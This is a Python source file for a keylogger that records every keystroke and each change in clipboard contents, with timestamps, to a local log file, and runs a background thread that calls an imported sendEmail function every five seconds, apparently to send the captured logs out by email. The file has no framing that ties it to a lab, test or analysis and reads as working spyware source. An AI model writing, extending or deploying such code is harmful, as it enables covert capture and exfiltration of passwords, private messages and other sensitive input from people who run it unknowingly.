import os
import threading
import time
from datetime import datetime 
from pynput import keyboard
import pyperclip
from threading import Thread
from emailFunctionality import sendEmail

log_file = "logs.txt"

ThreadRunning = True
def on_press(key):
    global ThreadRunning
    if key == keyboard.Key.esc:
        print("escape")
        ThreadRunning = False
        return False  
    
    keyPressed = returnKeyType(key)
    with open(log_file, "a") as keyLogs:
        keyLogs.write(parseOutput(keyPressed))

def returnKeyType(key):
    try:
        keyPressed = key.char
    except AttributeError:
        keyPressed = key.name

    return keyPressed

def parseOutput(keyPressed):
    currTime = datetime.now()
    currTimeString = currTime.strftime("%H:%M:%S %d-%m-%Y")
    keyPressed = keyPressed + "     " + currTimeString + "\n"
    return keyPressed

def checkClipBoard():
    prevContent = None

    while ThreadRunning:
        currContent = pyperclip.paste()
        if currContent != prevContent:
            prevContent = currContent
            with open(log_file, "a") as keyLogs:
                keyLogs.write(parseOutput(prevContent))

        time.sleep(1)
    

def sendToEmail():

    while ThreadRunning:
        sendEmail()
        time.sleep(5)
    return


if __name__ == "__main__":
    try: 
        listener = keyboard.Listener(on_press=on_press)
        checkClipBoardThread = threading.Thread(target=checkClipBoard)
        checkClipBoardThread.daemon = True
        checkClipBoardThread.start()

        sendEmailThread = threading.Thread(target=sendToEmail)
        sendEmailThread.daemon = True
        sendEmailThread.start()

        listener.start() 
        listener.join()  
    except KeyboardInterrupt:
        ThreadRunning = False
        


